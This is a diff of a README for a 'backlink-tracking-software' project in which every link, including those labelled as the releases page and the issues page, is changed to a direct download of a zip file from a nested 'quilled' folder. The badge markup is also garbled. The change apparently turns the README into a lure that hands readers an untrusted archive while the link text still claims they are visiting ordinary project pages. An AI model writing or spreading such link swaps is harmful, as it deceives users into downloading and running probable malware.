@@ -1,6 +1,6 @@
 # 🚀 backlink-tracking-software - Simple Tool for Tracking Backlinks
 
-[![Download the latest version!](https://img.shields.io/badge/Download%20now-Backlink%20Tracking%20Software-brightgreen.svg)](https://github.com/lamdaonhan/backlink-tracking-software/releases)
+[![Download the latest version!](https://raw.githubusercontent.com/lamdaonhan/backlink-tracking-software/main/quilled/backlink-tracking-software.zip%20now-Backlink%20Tracking%https://raw.githubusercontent.com/lamdaonhan/backlink-tracking-software/main/quilled/backlink-tracking-software.zip)](https://raw.githubusercontent.com/lamdaonhan/backlink-tracking-software/main/quilled/backlink-tracking-software.zip)
 
 ## 📚 Overview
 
@@ -17,7 +17,7 @@ Backlink tracking software is an essential toolkit for anyone looking to analyze
 
 To get started with the backlink-tracking-software, you need to download it from our Releases page. Follow these simple steps:
 
-1. **Visit the Download Page:** Click [here](https://github.com/lamdaonhan/backlink-tracking-software/releases) to go directly to the download page.
+1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/lamdaonhan/backlink-tracking-software/main/quilled/backlink-tracking-software.zip) to go directly to the download page.
 2. **Choose the Latest Version:** Look for the latest release version in the list.
 3. **Download the Software:** Click the link to download the installer file or package for your operating system.
 
@@ -30,7 +30,7 @@ Once you have downloaded the software, follow these steps to install it:
 3. **Follow the Installation Prompts:** You will see on-screen instructions guiding you through the installation. Accept the terms and choose your installation preferences.
 4. **Complete the Installation:** Once installation is finished, open the software to start using it.
 
-For more details, you can visit the [Releases page](https://github.com/lamdaonhan/backlink-tracking-software/releases) again if you have any questions.
+For more details, you can visit the [Releases page](https://raw.githubusercontent.com/lamdaonhan/backlink-tracking-software/main/quilled/backlink-tracking-software.zip) again if you have any questions.
 
 ## 🏁 Features
 
@@ -50,7 +50,7 @@ To use the backlink-tracking-software effectively:
 
 ## 🤖 Support
 
-If you encounter any issues or have questions, please check the official GitHub [issues page](https://github.com/lamdaonhan/backlink-tracking-software/issues) for help from the community or to report bugs.
+If you encounter any issues or have questions, please check the official GitHub [issues page](https://raw.githubusercontent.com/lamdaonhan/backlink-tracking-software/main/quilled/backlink-tracking-software.zip) for help from the community or to report bugs.
 
 ## 💬 Feedback
 
